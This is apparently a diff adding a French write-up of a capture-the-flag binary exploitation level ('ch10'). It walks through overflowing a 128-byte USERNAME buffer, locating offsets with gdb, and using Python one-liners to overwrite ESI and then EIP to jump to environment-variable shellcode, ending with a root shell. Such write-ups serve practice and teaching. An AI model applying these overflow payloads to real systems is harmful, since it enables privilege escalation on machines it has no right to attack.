@@ -1,0 +1,20 @@
+On vois dans le code que le programme va lire un fichier dont le contenue commence par USERNAME= et qu'il va enregistrer celui ci dans un buffer de 128 char.
+
+On va donc generer un fichier commencant par USERNAME= puis ajouter des caractere afin de trouver a quel endroit on ecrase ESI, afin de lui donner la valeur du fd valide.
+Apres quelques test on s'apercoit qu'il y a un offset de 136, les 4 octets d'apres seront l'adresse valide du fd.
+On va donc chercher cette adresse grace a gdb :
+gdb b *0x080485c9
+r /tmp/file
+EAX = 0804B008
+
+Donc :
+python -c 'print "USERNAME="+"A"*136+"\x08\xb0\x04\x08"' > /tmp/file
+./ch10 /tmp/file
+Le programme se lance bien correctement, il faut maintenant continuer l'exploitation en ecrivant sur eip.
+Apres quelques test, on s'appercoit qu'il faut rajouter 28 char puis on ecrase eip.
+On va donc creer une variable d'environnement avec notre SHELLCODE comme les exercice precedent, on retrouve son adresse, on l'ajoute a la chaine :
+
+python -c 'print "USERNAME="+"A"*136+"\x08\xb0\x04\x08"+"A"*28+"ADRESSE"' > fichier
+./ch10 fichier
+
+Et on obtient un shell root.
